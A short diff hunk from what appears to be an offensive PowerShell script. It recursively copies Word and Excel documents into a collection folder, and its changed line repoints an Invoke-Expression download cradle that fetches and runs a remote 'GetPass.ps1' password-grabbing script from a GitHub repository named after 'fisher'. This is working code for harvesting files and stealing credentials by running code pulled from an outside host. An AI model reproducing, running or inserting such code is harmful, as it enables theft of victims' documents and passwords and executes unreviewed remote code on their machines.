@@ -2751,7 +2751,7 @@ Dir -filter *.docx -recurse $copyDir | ForEach-Object {Copy-Item $_.FullName $co
 Dir -filter *.xls -recurse $copyDir | ForEach-Object {Copy-Item $_.FullName $copyToDir}
 Dir -filter *.xlsx -recurse $copyDir | ForEach-Object {Copy-Item $_.FullName $copyToDir}
 
-IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/Hpower96/fisher/master/GetPass.ps1');
+IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/kalivim/Powershell_fisher/master/GetPass.ps1');
 
 $date = get-date
 
